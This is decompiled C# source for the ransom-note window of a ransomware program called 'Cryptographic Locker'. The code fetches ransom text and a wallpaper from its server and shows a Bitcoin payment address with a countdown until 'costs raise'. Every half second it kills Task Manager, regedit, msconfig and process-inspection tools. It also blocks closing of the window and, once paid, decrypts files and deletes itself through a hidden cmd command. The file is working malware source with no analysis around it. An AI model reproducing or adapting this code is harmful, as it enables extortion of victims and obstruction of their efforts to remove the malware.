using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using System.Timers;
using System.Windows.Forms;
using Locker.Properties;
using Microsoft.Win32;

namespace Locker;

public class frmMain : Form
{
	private delegate void SetTextDelegate(Label textbox, string value);

	private delegate void RefreshFormValuesDelegate();

	private delegate void ProgressbarSetValueDelegate(int value);

	private const int WM_COMMAND = 273;

	private const int MIN_ALL = 419;

	private const int SPI_SETDESKWALLPAPER = 20;

	private const int SPIF_UPDATEINIFILE = 1;

	private const int SPIF_SENDWININICHANGE = 2;

	private System.Timers.Timer tmrCheck = new System.Timers.Timer();

	private System.Timers.Timer tmrStealth = new System.Timers.Timer();

	private TimeSpan timeLeft;

	private string[] mainText;

	private bool exitAllowed;

	private TreeWalker walker;

	private IContainer components;

	private RichTextBox txtMaintext;

	private PictureBox pbLogo;

	private Label lblTimetext;

	private TextBox txtBitcoinAddress;

	private Label lblBitcoinaddress;

	private Button btnCopyBitcoinAddress;

	private Button btnDecrypt;

	private Button btnOpenFilelist;

	private TextBox txtKey;

	private TextBox txtIv;

	private Label lblKey;

	private Label lblIv;

	private Button btnCheck;

	private Button btnPreviousPage;

	private Button btnNextPage;

	private Label lblTime;

	private Label lblCosts;

	private Label lblPaid;

	private TextBox txtCosts;

	private TextBox txtPaid;

	private Label lblBtc;

	private Label lblBtc2;

	private Timer tmrStopWatch;

	private Label lblLastCheck;

	private ProgressBar pbDecrypt;

	public frmMain()
	{
		InitializeComponent();
		string serverMainText = Program.server.GetServerMainText();
		mainText = serverMainText.Split(new string[1] { "--page--" }, StringSplitOptions.None);
		updateForm();
		tmrStopWatch.set_Enabled(true);
		tmrCheck.Interval = 1800000.0;
		tmrCheck.Elapsed += tmrCheck_Elapsed;
		tmrCheck.Enabled = true;
		btnPreviousPage_Click(null, null);
		tmrStealth.Interval = 500.0;
		tmrStealth.Elapsed += tmrStealth_Elapsed;
		tmrStealth.Enabled = true;
		setDesktopBackground(finish: false);
		minimizeAllWindows();
	}

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr SendMessage(IntPtr hWnd, int Msg, IntPtr wParam, IntPtr lParam);

	private void minimizeAllWindows()
	{
		IntPtr hWnd = FindWindow("Shell_TrayWnd", null);
		SendMessage(hWnd, 273, (IntPtr)419, IntPtr.Zero);
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

	public void setDesktopBackground(bool finish)
	{
		try
		{
			string text = Path.Combine(Path.GetTempPath(), "wallpaper.jpg");
			Program.server.DownloadFile(finish ? "tmps2.dat" : "tmps.dat", text);
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", writable: true);
			registryKey.SetValue("WallpaperStyle", 1.ToString());
			registryKey.SetValue("TileWallpaper", 0.ToString());
			SystemParametersInfo(20, 0, text, 3);
		}
		catch (Exception)
		{
		}
	}

	private void tmrStealth_Elapsed(object sender, ElapsedEventArgs e)
	{
		try
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				if (process.ProcessName.ToLower().Contains("processhacker") || process.ProcessName.ToLower().Contains("msconfig") || process.ProcessName.ToLower().Contains("taskmgr") || process.ProcessName.ToLower().Contains("regedit") || process.ProcessName.ToLower().Contains("procexp"))
				{
					process.Kill();
				}
			}
		}
		catch (Exception)
		{
		}
	}

	private void tmrCheck_Elapsed(object sender, ElapsedEventArgs e)
	{
		updateForm();
	}

	private void updateForm()
	{
		SetText(lblLastCheck, "Checking...");
		Program.status = Program.server.GetStatus();
		RefreshFormValues();
	}

	private void SetText(Label textbox, string value)
	{
		if (((Control)textbox).get_InvokeRequired())
		{
			SetTextDelegate setTextDelegate = SetText;
			((Control)this).Invoke((Delegate)setTextDelegate, new object[2] { textbox, value });
		}
		else
		{
			((Control)textbox).set_Text(value);
		}
	}

	private void RefreshFormValues()
	{
		if (((Control)txtCosts).get_InvokeRequired())
		{
			RefreshFormValuesDelegate refreshFormValuesDelegate = RefreshFormValues;
			((Control)this).Invoke((Delegate)refreshFormValuesDelegate);
			return;
		}
		if (Program.status.Count == 0)
		{
			((Control)lblTime).set_Text("Server down");
		}
		((Control)txtCosts).set_Text(Program.status["costs"]);
		((Control)txtPaid).set_Text(Program.status["balance"]);
		((Control)txtBitcoinAddress).set_Text(Program.status["address"]);
		if (Program.status["key"] != null && Program.status["key"] != string.Empty)
		{
			((Control)btnDecrypt).set_Enabled(true);
			tmrStopWatch.set_Enabled(false);
			tmrStealth.Enabled = false;
			((Control)lblTime).set_Text("Thank you!");
			((Control)txtKey).set_Text(Program.status["key"]);
			((Control)txtIv).set_Text(Program.status["iv"]);
			minimizeAllWindows();
		}
		else
		{
			string s = Program.status["time"];
			int result = 0;
			int.TryParse(s, out result);
			timeLeft = TimeSpan.FromSeconds(result);
		}
		((Control)lblLastCheck).set_Text("Last check: " + DateTime.Now);
	}

	private void btnOpenFilelist_Click(object sender, EventArgs e)
	{
		try
		{
			File.Copy(FileLockList.filelist, Path.Combine(Path.GetTempPath(), "CryptoLockerFileList.txt"), overwrite: true);
		}
		catch (Exception)
		{
		}
		Process.Start("notepad.exe", Path.Combine(Path.GetTempPath(), "CryptoLockerFileList.txt"));
	}

	private void frmMain_FormClosing(object sender, FormClosingEventArgs e)
	{
		if (!exitAllowed)
		{
			((CancelEventArgs)(object)e).Cancel = true;
		}
	}

	private void tmrStopWatch_Tick(object sender, EventArgs e)
	{
		if (timeLeft.TotalSeconds < 1.0)
		{
			if (((Control)txtCosts).get_Text() != "")
			{
				updateForm();
			}
			return;
		}
		timeLeft = timeLeft.Subtract(new TimeSpan(0, 0, 1));
		((Control)lblTime).set_Text(timeLeft.Hours + ":" + timeLeft.Minutes + ":" + timeLeft.Seconds);
	}

	private void btnCopyBitcoinAddress_Click(object sender, EventArgs e)
	{
		Clipboard.SetText(((Control)txtBitcoinAddress).get_Text());
	}

	private void btnCheck_Click(object sender, EventArgs e)
	{
		Thread thread = new Thread(updateForm);
		thread.Start();
	}

	private void btnDecrypt_Click(object sender, EventArgs e)
	{
		if (Program.status["key"] != null && Program.status["key"] != string.Empty)
		{
			((Control)btnDecrypt).set_Enabled(false);
			((Control)btnCheck).set_Enabled(false);
			((Control)btnPreviousPage).set_Enabled(false);
			((Control)btnNextPage).set_Enabled(false);
			((Control)txtMaintext).set_Text("Decryption in progress, this can take several minutes to serveral hours depending on your computer speed.");
			((Control)pbDecrypt).set_Visible(true);
			BackgroundWorker backgroundWorker = new BackgroundWorker();
			backgroundWorker.RunWorkerCompleted += bw_RunWorkerCompleted;
			backgroundWorker.DoWork += bw_DoWork;
			backgroundWorker.RunWorkerAsync();
		}
	}

	private void bw_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
	{
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		((Control)pbDecrypt).set_Visible(false);
		pbDecrypt.set_Value(0);
		MessageBox.Show("Files restored! Program will destroy itself.", "Files restored", (MessageBoxButtons)0, (MessageBoxIcon)64);
		exitAllowed = true;
		new Thread(Destroy).Start();
		((Control)this).Hide();
	}

	public void Destroy()
	{
		Program.RemoveFromStartup();
		try
		{
			File.Delete(FileLockList.filelist);
		}
		catch (Exception)
		{
		}
		Process process = new Process();
		process.StartInfo.FileName = "cmd.exe";
		process.StartInfo.Arguments = "/c PING -n 11 127.0.0.1>nul & del \"" + Assembly.GetExecutingAssembly().Location + "\"";
		process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo.CreateNoWindow = true;
		process.Start();
		Application.Exit();
	}

	private void bw_DoWork(object sender, DoWorkEventArgs e)
	{
		walker = new TreeWalker();
		walker.Search();
		System.Timers.Timer timer = new System.Timers.Timer();
		timer.Interval = 1000.0;
		timer.Elapsed += tmrProgress_Elapsed;
		timer.Start();
		walker.Decrypt();
		timer.Stop();
		setDesktopBackground(finish: true);
	}

	private void tmrProgress_Elapsed(object sender, ElapsedEventArgs e)
	{
		ProgressbarSetValue((int)((double)walker.CurrentFileNumber / (double)walker.FileCount * 100.0));
	}

	private void ProgressbarSetValue(int value)
	{
		if (((Control)pbDecrypt).get_InvokeRequired())
		{
			ProgressbarSetValueDelegate progressbarSetValueDelegate = ProgressbarSetValue;
			((Control)this).Invoke((Delegate)progressbarSetValueDelegate, new object[1] { value });
		}
		else
		{
			pbDecrypt.set_Value(value);
		}
	}

	private void btnPreviousPage_Click(object sender, EventArgs e)
	{
		if (mainText.Length > 1)
		{
			((Control)txtMaintext).set_Text(mainText[0]);
		}
	}

	private void btnNextPage_Click(object sender, EventArgs e)
	{
		if (mainText.Length > 1)
		{
			((Control)txtMaintext).set_Text(mainText[1]);
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Expected O, but got Unknown
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Expected O, but got Unknown
		//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ec: Expected O, but got Unknown
		//IL_00ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f7: Expected O, but got Unknown
		//IL_00f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0102: Expected O, but got Unknown
		//IL_0103: Unknown result type (might be due to invalid IL or missing references)
		//IL_010d: Expected O, but got Unknown
		//IL_0114: Unknown result type (might be due to invalid IL or missing references)
		//IL_011e: Expected O, but got Unknown
		//IL_011f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0129: Expected O, but got Unknown
		//IL_012a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0134: Expected O, but got Unknown
		//IL_0158: Unknown result type (might be due to invalid IL or missing references)
		//IL_0162: Expected O, but got Unknown
		//IL_01ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f8: Expected O, but got Unknown
		//IL_02db: Unknown result type (might be due to invalid IL or missing references)
		//IL_02e5: Expected O, but got Unknown
		//IL_0749: Unknown result type (might be due to invalid IL or missing references)
		//IL_0753: Expected O, but got Unknown
		//IL_07f7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0801: Expected O, but got Unknown
		//IL_08a5: Unknown result type (might be due to invalid IL or missing references)
		//IL_08af: Expected O, but got Unknown
		//IL_0f41: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f4b: Expected O, but got Unknown
		components = new Container();
		new ComponentResourceManager(typeof(frmMain));
		txtMaintext = new RichTextBox();
		lblTimetext = new Label();
		txtBitcoinAddress = new TextBox();
		lblBitcoinaddress = new Label();
		btnCopyBitcoinAddress = new Button();
		btnDecrypt = new Button();
		btnOpenFilelist = new Button();
		txtKey = new TextBox();
		txtIv = new TextBox();
		lblKey = new Label();
		lblIv = new Label();
		btnCheck = new Button();
		btnPreviousPage = new Button();
		btnNextPage = new Button();
		lblTime = new Label();
		pbLogo = new PictureBox();
		lblCosts = new Label();
		lblPaid = new Label();
		txtCosts = new TextBox();
		txtPaid = new TextBox();
		lblBtc = new Label();
		lblBtc2 = new Label();
		tmrStopWatch = new Timer(components);
		lblLastCheck = new Label();
		pbDecrypt = new ProgressBar();
		((ISupportInitialize)pbLogo).BeginInit();
		((Control)this).SuspendLayout();
		((Control)txtMaintext).set_Font(new Font("Century", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)txtMaintext).set_ForeColor(SystemColors.MenuText);
		((Control)txtMaintext).set_Location(new Point(272, 11));
		((Control)txtMaintext).set_Name("txtMaintext");
		((TextBoxBase)txtMaintext).set_ReadOnly(true);
		((Control)txtMaintext).set_Size(new Size(648, 478));
		((Control)txtMaintext).set_TabIndex(1);
		((Control)txtMaintext).set_Text("Your personal documents and files on this computer or device have just been encrypted.\nA list of file extensions that got encrypted can be found on the bottom of this page.");
		((Control)lblTimetext).set_Font(new Font("Century", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)lblTimetext).set_ForeColor(SystemColors.ActiveCaptionText);
		((Control)lblTimetext).set_Location(new Point(12, 246));
		((Control)lblTimetext).set_Name("lblTimetext");
		((Control)lblTimetext).set_Size(new Size(254, 21));
		((Control)lblTimetext).set_TabIndex(3);
		((Control)lblTimetext).set_Text("Time untill costs raise");
		lblTimetext.set_TextAlign((ContentAlignment)32);
		((Control)txtBitcoinAddress).set_Location(new Point(600, 540));
		((Control)txtBitcoinAddress).set_Name("txtBitcoinAddress");
		((TextBoxBase)txtBitcoinAddress).set_ReadOnly(true);
		((Control)txtBitcoinAddress).set_Size(new Size(267, 20));
		((Control)txtBitcoinAddress).set_TabIndex(4);
		((Control)lblBitcoinaddress).set_Font(new Font("Century", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)lblBitcoinaddress).set_ForeColor(SystemColors.ActiveCaptionText);
		((Control)lblBitcoinaddress).set_Location(new Point(272, 540));
		((Control)lblBitcoinaddress).set_Name("lblBitcoinaddress");
		((Control)lblBitcoinaddress).set_Size(new Size(320, 21));
		((Control)lblBitcoinaddress).set_TabIndex(5);
		((Control)lblBitcoinaddress).set_Text("Send bitcoins to this bitcoin address:");
		lblBitcoinaddress.set_TextAlign((ContentAlignment)32);
		((Control)btnCopyBitcoinAddress).set_ForeColor(SystemColors.ActiveCaptionText);
		((Control)btnCopyBitcoinAddress).set_Location(new Point(873, 539));
		((Control)btnCopyBitcoinAddress).set_Name("btnCopyBitcoinAddress");
		((Control)btnCopyBitcoinAddress).set_Size(new Size(47, 21));
		((Control)btnCopyBitcoinAddress).set_TabIndex(6);
		((Control)btnCopyBitcoinAddress).set_Text("Copy");
		((ButtonBase)btnCopyBitcoinAddress).set_UseVisualStyleBackColor(true);
		((Control)btnCopyBitcoinAddress).add_Click((EventHandler)btnCopyBitcoinAddress_Click);
		((Control)btnDecrypt).set_Enabled(false);
		((Control)btnDecrypt).set_ForeColor(SystemColors.ActiveCaptionText);
		((Control)btnDecrypt).set_Location(new Point(12, 479));
		((Control)btnDecrypt).set_Name("btnDecrypt");
		((Control)btnDecrypt).set_Size(new Size(254, 40));
		((Control)btnDecrypt).set_TabIndex(7);
		((Control)btnDecrypt).set_Text("Decrypt using keys");
		((ButtonBase)btnDecrypt).set_UseVisualStyleBackColor(true);
		((Control)btnDecrypt).add_Click((EventHandler)btnDecrypt_Click);
		((Control)btnOpenFilelist).set_ForeColor(SystemColors.ActiveCaptionText);
		((Control)btnOpenFilelist).set_Location(new Point(12, 207));
		((Control)btnOpenFilelist).set_Name("btnOpenFilelist");
		((Control)btnOpenFilelist).set_Size(new Size(254, 36));
		((Control)btnOpenFilelist).set_TabIndex(8);
		((Control)btnOpenFilelist).set_Text("View encrypted files");
		((ButtonBase)btnOpenFilelist).set_UseVisualStyleBackColor(true);
		((Control)btnOpenFilelist).add_Click((EventHandler)btnOpenFilelist_Click);
		((Control)txtKey).set_Location(new Point(42, 453));
		((Control)txtKey).set_Name("txtKey");
		((TextBoxBase)txtKey).set_ReadOnly(true);
		((Control)txtKey).set_Size(new Size(80, 20));
		((Control)txtKey).set_TabIndex(9);
		((Control)txtIv).set_Location(new Point(186, 453));
		((Control)txtIv).set_Name("txtIv");
		((TextBoxBase)txtIv).set_ReadOnly(true);
		((Control)txtIv).set_Size(new Size(80, 20));
		((Control)txtIv).set_TabIndex(10);
		((Control)lblKey).set_AutoSize(true);
		((Control)lblKey).set_ForeColor(SystemColors.ActiveCaptionText);
		((Control)lblKey).set_Location(new Point(9, 456));
		((Control)lblKey).set_Name("lblKey");
		((Control)lblKey).set_Size(new Size(27, 13));
		((Control)lblKey).set_TabIndex(11);
		((Control)lblKey).set_Text("key:");
		((Control)lblIv).set_AutoSize(true);
		((Control)lblIv).set_ForeColor(SystemColors.ActiveCaptionText);
		((Control)lblIv).set_Location(new Point(160, 456));
		((Control)lblIv).set_Name("lblIv");
		((Control)lblIv).set_Size(new Size(20, 13));
		((Control)lblIv).set_TabIndex(12);
		((Control)lblIv).set_Text("IV:");
		((Control)btnCheck).set_ForeColor(SystemColors.ActiveCaptionText);
		((Control)btnCheck).set_Location(new Point(12, 407));
		((Control)btnCheck).set_Name("btnCheck");
		((Control)btnCheck).set_Size(new Size(254, 40));
		((Control)btnCheck).set_TabIndex(13);
		((Control)btnCheck).set_Text("Check payment and receive keys");
		((ButtonBase)btnCheck).set_UseVisualStyleBackColor(true);
		((Control)btnCheck).add_Click((EventHandler)btnCheck_Click);
		((Control)btnPreviousPage).set_Font(new Font("Microsoft Sans Serif", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)btnPreviousPage).set_ForeColor(SystemColors.ActiveCaptionText);
		((Control)btnPreviousPage).set_Location(new Point(272, 496));
		((Control)btnPreviousPage).set_Name("btnPreviousPage");
		((Control)btnPreviousPage).set_Size(new Size(320, 40));
		((Control)btnPreviousPage).set_TabIndex(14);
		((Control)btnPreviousPage).set_Text("<< Previous Page");
		((ButtonBase)btnPreviousPage).set_UseVisualStyleBackColor(true);
		((Control)btnPreviousPage).add_Click((EventHandler)btnPreviousPage_Click);
		((Control)btnNextPage).set_Font(new Font("Microsoft Sans Serif", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)btnNextPage).set_ForeColor(SystemColors.ActiveCaptionText);
		((Control)btnNextPage).set_Location(new Point(600, 496));
		((Control)btnNextPage).set_Name("btnNextPage");
		((Control)btnNextPage).set_Size(new Size(320, 40));
		((Control)btnNextPage).set_TabIndex(15);
		((Control)btnNextPage).set_Text("Next Page >>");
		((ButtonBase)btnNextPage).set_UseVisualStyleBackColor(true);
		((Control)btnNextPage).add_Click((EventHandler)btnNextPage_Click);
		((Control)lblTime).set_Font(new Font("Microsoft Sans Serif", 27.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)lblTime).set_ForeColor(Color.Lime);
		((Control)lblTime).set_Location(new Point(12, 283));
		((Control)lblTime).set_Name("lblTime");
		((Control)lblTime).set_Size(new Size(254, 55));
		((Control)lblTime).set_TabIndex(16);
		((Control)lblTime).set_Text("Loading...");
		lblTime.set_TextAlign((ContentAlignment)32);
		((Control)pbLogo).set_BackColor(Color.Red);
		pbLogo.set_Image((Image)(object)Resources.shield);
		pbLogo.set_InitialImage((Image)null);
		((Control)pbLogo).set_Location(new Point(12, 12));
		((Control)pbLogo).set_Name("pbLogo");
		((Control)pbLogo).set_Size(new Size(254, 189));
		pbLogo.set_SizeMode((PictureBoxSizeMode)4);
		pbLogo.set_TabIndex(2);
		pbLogo.set_TabStop(false);
		((Control)lblCosts).set_AutoSize(true);
		((Control)lblCosts).set_ForeColor(SystemColors.ActiveCaptionText);
		((Control)lblCosts).set_Location(new Point(9, 360));
		((Control)lblCosts).set_Name("lblCosts");
		((Control)lblCosts).set_Size(new Size(36, 13));
		((Control)lblCosts).set_TabIndex(17);
		((Control)lblCosts).set_Text("Costs:");
		((Control)lblPaid).set_AutoSize(true);
		((Control)lblPaid).set_ForeColor(SystemColors.ActiveCaptionText);
		((Control)lblPaid).set_Location(new Point(9, 384));
		((Control)lblPaid).set_Name("lblPaid");
		((Control)lblPaid).set_Size(new Size(31, 13));
		((Control)lblPaid).set_TabIndex(18);
		((Control)lblPaid).set_Text("Paid:");
		((Control)txtCosts).set_Location(new Point(42, 357));
		((Control)txtCosts).set_Name("txtCosts");
		((TextBoxBase)txtCosts).set_ReadOnly(true);
		((Control)txtCosts).set_Size(new Size(80, 20));
		((Control)txtCosts).set_TabIndex(19);
		((Control)txtPaid).set_Location(new Point(42, 381));
		((Control)txtPaid).set_Name("txtPaid");
		((TextBoxBase)txtPaid).set_ReadOnly(true);
		((Control)txtPaid).set_Size(new Size(80, 20));
		((Control)txtPaid).set_TabIndex(20);
		((Control)lblBtc).set_AutoSize(true);
		((Control)lblBtc).set_ForeColor(SystemColors.ActiveCaptionText);
		((Control)lblBtc).set_Location(new Point(128, 360));
		((Control)lblBtc).set_Name("lblBtc");
		((Control)lblBtc).set_Size(new Size(22, 13));
		((Control)lblBtc).set_TabIndex(21);
		((Control)lblBtc).set_Text("btc");
		((Control)lblBtc2).set_AutoSize(true);
		((Control)lblBtc2).set_ForeColor(SystemColors.ActiveCaptionText);
		((Control)lblBtc2).set_Location(new Point(128, 384));
		((Control)lblBtc2).set_Name("lblBtc2");
		((Control)lblBtc2).set_Size(new Size(22, 13));
		((Control)lblBtc2).set_TabIndex(22);
		((Control)lblBtc2).set_Text("btc");
		tmrStopWatch.set_Interval(1000);
		tmrStopWatch.add_Tick((EventHandler)tmrStopWatch_Tick);
		((Control)lblLastCheck).set_AutoSize(true);
		((Control)lblLastCheck).set_ForeColor(Color.Lime);
		((Control)lblLastCheck).set_Location(new Point(9, 549));
		((Control)lblLastCheck).set_Name("lblLastCheck");
		((Control)lblLastCheck).set_Size(new Size(63, 13));
		((Control)lblLastCheck).set_TabIndex(23);
		((Control)lblLastCheck).set_Text("Last check:");
		((Control)pbDecrypt).set_Location(new Point(3, 540));
		((Control)pbDecrypt).set_Name("pbDecrypt");
		((Control)pbDecrypt).set_Size(new Size(917, 23));
		((Control)pbDecrypt).set_TabIndex(24);
		((Control)pbDecrypt).set_Visible(false);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Red);
		((Form)this).set_ClientSize(new Size(932, 571));
		((Control)this).get_Controls().Add((Control)(object)pbDecrypt);
		((Control)this).get_Controls().Add((Control)(object)lblLastCheck);
		((Control)this).get_Controls().Add((Control)(object)lblBtc2);
		((Control)this).get_Controls().Add((Control)(object)lblBtc);
		((Control)this).get_Controls().Add((Control)(object)txtPaid);
		((Control)this).get_Controls().Add((Control)(object)txtCosts);
		((Control)this).get_Controls().Add((Control)(object)lblPaid);
		((Control)this).get_Controls().Add((Control)(object)lblCosts);
		((Control)this).get_Controls().Add((Control)(object)lblTime);
		((Control)this).get_Controls().Add((Control)(object)btnNextPage);
		((Control)this).get_Controls().Add((Control)(object)btnPreviousPage);
		((Control)this).get_Controls().Add((Control)(object)btnCheck);
		((Control)this).get_Controls().Add((Control)(object)lblIv);
		((Control)this).get_Controls().Add((Control)(object)lblKey);
		((Control)this).get_Controls().Add((Control)(object)txtIv);
		((Control)this).get_Controls().Add((Control)(object)txtKey);
		((Control)this).get_Controls().Add((Control)(object)btnOpenFilelist);
		((Control)this).get_Controls().Add((Control)(object)btnDecrypt);
		((Control)this).get_Controls().Add((Control)(object)btnCopyBitcoinAddress);
		((Control)this).get_Controls().Add((Control)(object)lblBitcoinaddress);
		((Control)this).get_Controls().Add((Control)(object)txtBitcoinAddress);
		((Control)this).get_Controls().Add((Control)(object)lblTimetext);
		((Control)this).get_Controls().Add((Control)(object)pbLogo);
		((Control)this).get_Controls().Add((Control)(object)txtMaintext);
		((Control)this).set_ForeColor(SystemColors.AppWorkspace);
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Form)this).set_Icon(Resources.shield1);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("frmMain");
		((Control)this).set_Text("Cryptographic Locker");
		((Form)this).add_FormClosing(new FormClosingEventHandler(frmMain_FormClosing));
		((ISupportInitialize)pbLogo).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
